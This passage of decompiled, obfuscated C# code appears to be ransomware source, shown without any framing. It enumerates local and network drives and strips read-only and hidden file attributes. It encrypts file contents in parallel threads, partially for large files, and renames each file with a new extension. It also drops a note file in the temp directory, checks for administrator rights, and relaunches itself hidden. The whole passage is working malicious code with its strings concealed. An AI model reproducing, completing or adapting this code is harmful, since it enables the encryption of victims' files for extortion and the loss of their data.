				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void pCTrEemjBb()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			cMEEnMgkUxxsbbNh(FEZRNsQdHf(getString_0(107386872)), FEZRNsQdHf(getString_0(107386891)));
			cMEEnMgkUxxsbbNh(FEZRNsQdHf(getString_0(107386872)), FEZRNsQdHf(getString_0(107386761)));
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string qXUYdHQrYgWEad(string tVaOfpAegYnXrpj, int tGRiBIJIHxuRuc = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(tGRiBIJIHxuRuc);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(tVaOfpAegYnXrpj, 1, intPtr, ref tGRiBIJIHxuRuc) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void fbCyLjnfYvogRbL()
	{
		cMEEnMgkUxxsbbNh(getString_0(107396509), FEZRNsQdHf(getString_0(107386071)));
		string text = FEZRNsQdHf(getString_0(107386421));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107388107) + text + getString_0(107388107) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396509);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void btQRMXqHMyAV(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386356) + string_0 + getString_0(107386347) + ex.Message + getString_0(107395746));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string KJOEdyafRmW()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107389296);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107386258);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107386281))) ? getString_0(107386231) : getString_0(107386240));
				break;
			case 0:
				text = getString_0(107386286);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107386253);
				break;
			case 4:
				text = getString_0(107385696);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107385710) : getString_0(107385687));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107385686) : getString_0(107385659)) : getString_0(107385664)) : getString_0(107385705));
				break;
			case 10:
				text = getString_0(107385681);
				break;
			}
		}
		if (text != getString_0(107389296))
		{
			text = getString_0(107385676) + text;
			if (oSVersion.ServicePack != getString_0(107389296))
			{
				text = text + getString_0(107387724) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string vOvGkzlJOtnBlcf(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107394851);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(FEZRNsQdHf(getString_0(107394818)));
				streamWriter.WriteLine(getString_0(107395746));
				streamWriter.WriteLine(FEZRNsQdHf(getString_0(107390344)));
				streamWriter.WriteLine(string_0);
				if (YazilaoopZ)
				{
					streamWriter.WriteLine(getString_0(107395746));
					streamWriter.WriteLine(FEZRNsQdHf(getString_0(107389738)));
					streamWriter.WriteLine(ATYckHdWsYOYHnae.VVqKyWIMql());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !PAOJgADrbjEa)
				{
					File.AppendAllText(text, getString_0(107389705) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(dtHHyJMWMTcTg, getString_0(107385631) + ex.Message + getString_0(107395746));
				}
				catch (Exception)
				{
				}
			}
		}
		return text;
	}

	private static void MOokytgLOEo(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		BecdIQUMdtqwF.gTngQbykchEa CS_0024_003C_003E8__locals0 = new BecdIQUMdtqwF();
		CS_0024_003C_003E8__locals0.nTBZXeQINsMZ = string_1;
		CS_0024_003C_003E8__locals0.CToRljeBfHM = string_2;
		CS_0024_003C_003E8__locals0.hSfGYaylYziGu = string_3;
		CS_0024_003C_003E8__locals0.SrUtXYDUZSmg = string_4;
		bGfpmpYMCsNkyjcK = Convert.FromBase64String(CS_0024_003C_003E8__locals0.hSfGYaylYziGu);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395994))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = qXUYdHQrYgWEad(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !ZmKssmQIdPi.Contains(text))
							{
								ZmKssmQIdPi.Add(text);
							}
							else if (!ZmKssmQIdPi.Contains(array[i].Name))
							{
								ZmKssmQIdPi.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!ZmKssmQIdPi.Contains(array[i].Name))
							{
								ZmKssmQIdPi.Add(array[i].Name);
							}
						}
					}
					else if (!ZmKssmQIdPi.Contains(array[i].Name))
					{
						ZmKssmQIdPi.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int i = 0; i < string_0.Length; i++)
			{
				if (!ZmKssmQIdPi.Contains(string_0[i]))
				{
					ZmKssmQIdPi.Add(string_0[i]);
				}
			}
		}
		if (ZmKssmQIdPi.Contains(FEZRNsQdHf(getString_0(107385574))) && lMZoDXXDrlQgS == getString_0(107396809))
		{
			ZmKssmQIdPi.Remove(FEZRNsQdHf(getString_0(107385574)));
		}
		Parallel.ForEach(ZmKssmQIdPi, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new BecdIQUMdtqwF.gTngQbykchEa();
			CS_0024_003C_003E8__locals0.AgPuEjqzXMvcD = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.UWCxsCbMhIkWpfJ = string_0;
			if (FRObTCxcUY && !KJOEdyafRmW().Contains(BecdIQUMdtqwF.getString_0(107385722)) && !KJOEdyafRmW().Contains(BecdIQUMdtqwF.getString_0(107401983)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						FdvYSFIGyAUutM(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.UWCxsCbMhIkWpfJ);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (rmNaxrdaErS == BecdIQUMdtqwF.getString_0(107396821))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					WAsxBnCueHJpKha(CS_0024_003C_003E8__locals0.UWCxsCbMhIkWpfJ, CS_0024_003C_003E8__locals0.AgPuEjqzXMvcD.nTBZXeQINsMZ, CS_0024_003C_003E8__locals0.AgPuEjqzXMvcD.SrUtXYDUZSmg, CS_0024_003C_003E8__locals0.AgPuEjqzXMvcD.CToRljeBfHM, CS_0024_003C_003E8__locals0.AgPuEjqzXMvcD.hSfGYaylYziGu);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				WAsxBnCueHJpKha(CS_0024_003C_003E8__locals0.UWCxsCbMhIkWpfJ, CS_0024_003C_003E8__locals0.nTBZXeQINsMZ, CS_0024_003C_003E8__locals0.SrUtXYDUZSmg, CS_0024_003C_003E8__locals0.CToRljeBfHM, CS_0024_003C_003E8__locals0.hSfGYaylYziGu);
			}
		});
	}

	public static void WAsxBnCueHJpKha(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107389296));
		List<string> list3 = list2;
		if (xEVAdQHTwaeaG == getString_0(107396236))
		{
			if (VVNvuJuOCGKqN == getString_0(107396809) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && vrnRKRhJqCfK(string_0))
			{
				OcOaVHeVHwUS ocOaVHeVHwUS = null;
				try
				{
					ocOaVHeVHwUS = new OcOaVHeVHwUS(string_0.Replace(getString_0(107397179), getString_0(107389296)));
				}
				catch
				{
					list = lGwItrCorKPHD(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					dMMVJNhsRNP(ocOaVHeVHwUS.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = lGwItrCorKPHD(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = lGwItrCorKPHD(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = dXtpYLlAbMp.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0495;
					}
				}
				if ((brYmtXjlZIq == getString_0(107396236) && !item.EndsWith(text)) || SNtBTLidlROtoV.Contains(item))
				{
					continue;
				}
				if (BBqvZtJMKtZyzF == getString_0(107396809))
				{
					try
					{
						if (SXyxscfevxEF.IyHWOJymzstKa(item))
						{
							SXyxscfevxEF.bVUJKLBlSikLI(item);
						}
					}
					catch
					{
					}
				}
				SNtBTLidlROtoV.Add(item);
				if (!HMEbcaxMfcYzgl.Contains(Path.GetDirectoryName(item)))
				{
					HMEbcaxMfcYzgl.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (QOKbVStgyeVL == getString_0(107396809) && fileStream.Length > Convert.ToInt32(UawyhGBHBLgS) * 1024 * 1024 && !list3.Contains(text))
					{
						if (DXDIUZMazYGZy == getString_0(107396809))
						{
							foreach (string item2 in YoPwmbBPpdD)
							{
								if (item.ToLower().EndsWith(item2) && HFFrRFIpQgjXI == getString_0(107396809))
								{
									if (Convert.ToInt32(PZYHNDUWTf) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											ATYckHdWsYOYHnae.GBhprVwnyvota(getString_0(107389857), getString_0(107389852), getString_0(107389871), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && HFFrRFIpQgjXI == getString_0(107396236))
								{
									try
									{
										ATYckHdWsYOYHnae.GBhprVwnyvota(getString_0(107389857), getString_0(107389852), getString_0(107389871), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = DwwAAJBOSmbJ.fENIZKTbvW(item, Convert.ToInt32(UawyhGBHBLgS) * 1024 * 1024);
						byte[] pLFvJzqFVyEE = DwwAAJBOSmbJ.ZUYcQJLxxSxnH(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						DwwAAJBOSmbJ.IjvngclRYVi(item, pLFvJzqFVyEE);
						if (string_2 != getString_0(107385565))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107385565))
					{
						yioNeaXTom(item, item + string_2, bGfpmpYMCsNkyjcK);
					}
					else
					{
						yioNeaXTom(item, item + getString_0(107385560), bGfpmpYMCsNkyjcK);
					}
				}
				catch (Exception)
				{
				}
				IL_0495:;
			}
		}
	}

	public static void dMMVJNhsRNP(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		bKLeOnnwOsJw.SmDDBVlBSoLlZfP CS_0024_003C_003E8__locals0 = new bKLeOnnwOsJw();
		CS_0024_003C_003E8__locals0.vJUzSMoRbycwzG = list_0;
		CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ = string_1;
		CS_0024_003C_003E8__locals0.nBTsxqqCcIrA = string_2;
		CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC = string_3;
		CS_0024_003C_003E8__locals0.MWjzSWdUTiapH = new List<string> { getString_0(107389296) };
		if (brYmtXjlZIq == getString_0(107396236))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.vJUzSMoRbycwzG)
				{
					if (((!item.Contains(bKLeOnnwOsJw.getString_0(107389372)) && !item.Contains(bKLeOnnwOsJw.getString_0(107389347)) && !item.Contains(bKLeOnnwOsJw.getString_0(107388802)) && !item.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388753)) && !item.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388772)) && !item.Contains(bKLeOnnwOsJw.getString_0(107388715)) && !item.Contains(bKLeOnnwOsJw.getString_0(107388694)) && !item.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388713)) && !item.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388700)) && !item.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388631)) && !item.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388622)) && !item.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388637)) && !item.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388611)) && !item.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388558))) || item.Contains(FEZRNsQdHf(bKLeOnnwOsJw.getString_0(107389045)))) && !item.Contains(bKLeOnnwOsJw.getString_0(107389004)) && !item.Contains(bKLeOnnwOsJw.getString_0(107389019)) && !item.Contains(bKLeOnnwOsJw.getString_0(107389002)) && !item.Contains(bKLeOnnwOsJw.getString_0(107388953)) && !item.Contains(bKLeOnnwOsJw.getString_0(107388968)) && !item.Contains(bKLeOnnwOsJw.getString_0(107388919)) && !item.Contains(bKLeOnnwOsJw.getString_0(107388934)) && !item.Contains(bKLeOnnwOsJw.getString_0(107388885)) && !item.Contains(bKLeOnnwOsJw.getString_0(107388904)) && !item.Contains(bKLeOnnwOsJw.getString_0(107388851)) && !item.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388870)) && !item.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388825)) && !item.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388840)) && !item.ToLower().Contains(bKLeOnnwOsJw.getString_0(107388279)) && !item.Contains(FEZRNsQdHf(bKLeOnnwOsJw.getString_0(107388294))) && !item.Contains(bKLeOnnwOsJw.getString_0(107388237)) && !item.Contains(bKLeOnnwOsJw.getString_0(107396364)) && !item.Contains(bKLeOnnwOsJw.getString_0(107388256)) && !item.EndsWith(CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ) && !item.EndsWith(bKLeOnnwOsJw.getString_0(107388231)) && !item.EndsWith(bKLeOnnwOsJw.getString_0(107388226)) && !item.EndsWith(bKLeOnnwOsJw.getString_0(107388221)) && !item.EndsWith(bKLeOnnwOsJw.getString_0(107388184)) && !item.Contains(bKLeOnnwOsJw.getString_0(107388179)) && !item.Contains(RoiBxbbYOpTnzdF) && !item.Contains(dtHHyJMWMTcTg) && !item.Contains(muQSQoYNOwJp))
					{
						if (CS_0024_003C_003E8__locals0.nBTsxqqCcIrA.Length != 0)
						{
							string[] nBTsxqqCcIrA2 = CS_0024_003C_003E8__locals0.nBTsxqqCcIrA;
							int num2 = 0;
							while (num2 < nBTsxqqCcIrA2.Length)
							{
								string value2 = nBTsxqqCcIrA2[num2];
								if (!item.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_0e8a;
							}
						}
						try
						{
							if (item.EndsWith(CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ))
							{
								goto IL_0e8a;
							}
						}
						catch (Exception)
						{
							goto IL_0e8a;
						}
						if (item.EndsWith(string_0) && !SNtBTLidlROtoV.Contains(item))
						{
							if (BBqvZtJMKtZyzF == bKLeOnnwOsJw.getString_0(107396829))
							{
								try
								{
									if (SXyxscfevxEF.IyHWOJymzstKa(item))
									{
										SXyxscfevxEF.bVUJKLBlSikLI(item);
									}
								}
								catch
								{
								}
							}
							SNtBTLidlROtoV.Add(item);
							if (!HMEbcaxMfcYzgl.Contains(Path.GetDirectoryName(item)))
							{
								HMEbcaxMfcYzgl.Add(Path.GetDirectoryName(item));
							}
							btQRMXqHMyAV(item);
							try
							{
								new slbXyVBmkFjuC().RBNXdzZVQAFiAJMA(item);
							}
							catch
							{
							}
							try
							{
								using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
								if (!fileStream2.CanWrite)
								{
									try
									{
										if (fgLeGcGjPkpRXH)
										{
											Console.WriteLine(bKLeOnnwOsJw.getString_0(107401946) + item + bKLeOnnwOsJw.getString_0(107401901) + new FileInfo(item).Length + bKLeOnnwOsJw.getString_0(107401880));
											Console.WriteLine(bKLeOnnwOsJw.getString_0(107401871));
										}
									}
									catch
									{
									}
									cMEEnMgkUxxsbbNh(FEZRNsQdHf(bKLeOnnwOsJw.getString_0(107402310)), bKLeOnnwOsJw.getString_0(107388127) + item + bKLeOnnwOsJw.getString_0(107388127) + FEZRNsQdHf(bKLeOnnwOsJw.getString_0(107402253)) + bKLeOnnwOsJw.getString_0(107388127) + Environment.UserName + bKLeOnnwOsJw.getString_0(107388127) + FEZRNsQdHf(bKLeOnnwOsJw.getString_0(107402268)));
								}
							}
							catch (Exception ex14)
							{
								if (CCDyMIHlAe)
								{
									try
									{
										File.AppendAllText(dtHHyJMWMTcTg, bKLeOnnwOsJw.getString_0(107386376) + item + bKLeOnnwOsJw.getString_0(107402243) + ex14.Message + bKLeOnnwOsJw.getString_0(107395766));
									}
									catch (Exception)
									{
									}
								}
								continue;
							}
							try
							{
								try
								{
									if (new FileInfo(item).Length != 0L)
									{
										goto end_IL_0740;
									}
									goto end_IL_073f;
									end_IL_0740:;
								}
								catch (Exception ex14)
								{
									if (CCDyMIHlAe)
									{
										try
										{
											File.AppendAllText(dtHHyJMWMTcTg, bKLeOnnwOsJw.getString_0(107386376) + item + bKLeOnnwOsJw.getString_0(107402130) + ex14.Message + bKLeOnnwOsJw.getString_0(107395766));
										}
										catch (Exception)
										{
										}
									}
									LVKhJcfUHGhpJNXz++;
									goto end_IL_073f;
								}
								byte[] bytes2;
								if (!(QOKbVStgyeVL == bKLeOnnwOsJw.getString_0(107396829)) || new FileInfo(item).Length <= Convert.ToInt32(UawyhGBHBLgS) * 1024 * 1024 || CS_0024_003C_003E8__locals0.MWjzSWdUTiapH.Contains(string_0))
								{
									if (YazilaoopZ)
									{
										CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ = tltXBlUAjNeRsFxCp + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ;
									}
									bytes2 = Encoding.ASCII.GetBytes(EXVykcHaTCNay);
									if (CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ != bKLeOnnwOsJw.getString_0(107385585))
									{
										if (!UOlZmEwYRBbnfmvt)
										{
											if (!PAOJgADrbjEa)
											{
												uEiSXmUOmqEhAY(item, item + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, bGfpmpYMCsNkyjcK);
											}
											else
											{
												uEiSXmUOmqEhAY(item, item + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC));
											}
										}
										else
										{
											try
											{
												if (!PAOJgADrbjEa)
												{
													toHVfEOmOJ(item, item + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, bGfpmpYMCsNkyjcK, Convert.FromBase64String(sTQyJSLcZOIiC));
												}
												else
												{
													toHVfEOmOJ(item, item + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC));
												}
											}
											catch (Exception ex14)
											{
												if (CCDyMIHlAe)
												{
													try
													{
														File.AppendAllText(dtHHyJMWMTcTg, bKLeOnnwOsJw.getString_0(107386376) + item + bKLeOnnwOsJw.getString_0(107385603) + ex14.Message + bKLeOnnwOsJw.getString_0(107395766));
													}
													catch (Exception)
													{
													}
												}
												LVKhJcfUHGhpJNXz++;
												try
												{
													File.Move(item + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, item);
												}
												catch (Exception)
												{
												}
												goto end_IL_073f;
											}
										}
									}
									else if (!UOlZmEwYRBbnfmvt)
									{
										if (!PAOJgADrbjEa)
										{
											uEiSXmUOmqEhAY(item, item + bKLeOnnwOsJw.getString_0(107385580), bGfpmpYMCsNkyjcK);
										}
										else
										{
											uEiSXmUOmqEhAY(item, item + bKLeOnnwOsJw.getString_0(107385580), Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC));
										}
									}
									else
									{
										try
										{
											if (!PAOJgADrbjEa)
											{
												toHVfEOmOJ(item, item, bGfpmpYMCsNkyjcK, Convert.FromBase64String(sTQyJSLcZOIiC));
											}
											else
											{
												toHVfEOmOJ(item, item, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC));
											}
										}
										catch (Exception ex14)
										{
											if (CCDyMIHlAe)
											{
												try
												{
													File.AppendAllText(dtHHyJMWMTcTg, bKLeOnnwOsJw.getString_0(107386376) + item + bKLeOnnwOsJw.getString_0(107385603) + ex14.Message + bKLeOnnwOsJw.getString_0(107395766));
												}
												catch (Exception)
												{
												}
											}
											LVKhJcfUHGhpJNXz++;
											goto end_IL_073f;
										}
									}
									if (PAOJgADrbjEa)
									{
										if (CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ != bKLeOnnwOsJw.getString_0(107385585))
										{
											QXCLEGXnLYcbL(item + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, bytes2);
										}
										else
										{
											QXCLEGXnLYcbL(item, bytes2);
										}
									}
									goto IL_0e8a;
								}
								CS_0024_003C_003E8__locals0 = new bKLeOnnwOsJw.EaaSLAhSrkAd();
								CS_0024_003C_003E8__locals0.SnSgbcozGOnPa = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ != bKLeOnnwOsJw.getString_0(107385585))
									{
										if (YazilaoopZ)
										{
											CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ = tltXBlUAjNeRsFxCp + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ;
										}
										File.Move(item, item + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ);
									}
								}
								catch (Exception ex14)
								{
									if (CCDyMIHlAe)
									{
										try
										{
											File.AppendAllText(dtHHyJMWMTcTg, bKLeOnnwOsJw.getString_0(107386376) + item + bKLeOnnwOsJw.getString_0(107401557) + ex14.Message + bKLeOnnwOsJw.getString_0(107395766));
										}
										catch (Exception)
										{
										}
									}
									LVKhJcfUHGhpJNXz++;
									goto end_IL_073f;
								}
								CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL = bKLeOnnwOsJw.getString_0(107389316);
								if (CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ != bKLeOnnwOsJw.getString_0(107385585))
								{
									CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL = item + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ;
								}
								else
								{
									CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL = item;
								}
								if (DXDIUZMazYGZy == bKLeOnnwOsJw.getString_0(107396829))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in YoPwmbBPpdD)
										{
											if (CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.SnSgbcozGOnPa.MaDQWNsFQFSMFZ) && HFFrRFIpQgjXI == bKLeOnnwOsJw.EaaSLAhSrkAd.getString_0(107396832))
											{
												if (Convert.ToInt32(PZYHNDUWTf) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL).Length)
												{
													try
													{
														ATYckHdWsYOYHnae.GBhprVwnyvota(bKLeOnnwOsJw.EaaSLAhSrkAd.getString_0(107389880), bKLeOnnwOsJw.EaaSLAhSrkAd.getString_0(107389875), bKLeOnnwOsJw.EaaSLAhSrkAd.getString_0(107389894), CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL.ToLower().EndsWith(item2) && HFFrRFIpQgjXI == bKLeOnnwOsJw.EaaSLAhSrkAd.getString_0(107396259))
											{
												try
												{
													ATYckHdWsYOYHnae.GBhprVwnyvota(bKLeOnnwOsJw.EaaSLAhSrkAd.getString_0(107389880), bKLeOnnwOsJw.EaaSLAhSrkAd.getString_0(107389875), bKLeOnnwOsJw.EaaSLAhSrkAd.getString_0(107389894), CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								bytes2 = Encoding.ASCII.GetBytes(EXVykcHaTCNay);
								if (nqNdPWHffReq == bKLeOnnwOsJw.getString_0(107396256))
								{
									byte[] array2 = null;
									byte[] byte_2 = DwwAAJBOSmbJ.fENIZKTbvW(CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL, Convert.ToInt32(UawyhGBHBLgS) * 1024 * 1024);
									if (DwwAAJBOSmbJ.IjvngclRYVi(PLFvJzqFVyEE: (!uBIPmjbCjNt) ? (PAOJgADrbjEa ? DwwAAJBOSmbJ.ZUYcQJLxxSxnH(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : DwwAAJBOSmbJ.ZUYcQJLxxSxnH(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (PAOJgADrbjEa ? lIsgGRoCjKMwrhD.QpIcrEUyluw(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC)) : lIsgGRoCjKMwrhD.QpIcrEUyluw(byte_2, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC))), rfRQjrzTSbahvMj: CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL, CYHcaFOGLSEpY: bytes2))
									{
										goto IL_0e8a;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, item);
									}
									catch (Exception)
									{
									}
								}
								else if (!PAOJgADrbjEa)
								{
									if (WZQPKbNkyop.RrUwydtFfvDr(CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL, UawyhGBHBLgS, CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC, null, Convert.FromBase64String(sTQyJSLcZOIiC)))
									{
										goto IL_0e8a;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, item);
									}
									catch (Exception)
									{
									}
								}
								else
								{
									if (WZQPKbNkyop.RrUwydtFfvDr(CS_0024_003C_003E8__locals0.HaKItZSuWfQSFL, UawyhGBHBLgS, CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC, bytes2, Convert.FromBase64String(sTQyJSLcZOIiC)))
									{
										goto IL_0e8a;
									}
									try
									{
										File.Move(item + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, item);
									}
									catch (Exception)
									{
									}
								}
								end_IL_073f:;
							}
							catch (Exception)
							{
								goto IL_0e8a;
							}
						}
					}
					continue;
					IL_0e8a:
					CS_0024_003C_003E8__locals0.vJUzSMoRbycwzG.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.vJUzSMoRbycwzG, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new bKLeOnnwOsJw.SmDDBVlBSoLlZfP();
			CS_0024_003C_003E8__locals0.SnSgbcozGOnPa = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.ldrdWbhdALtRA = string_0;
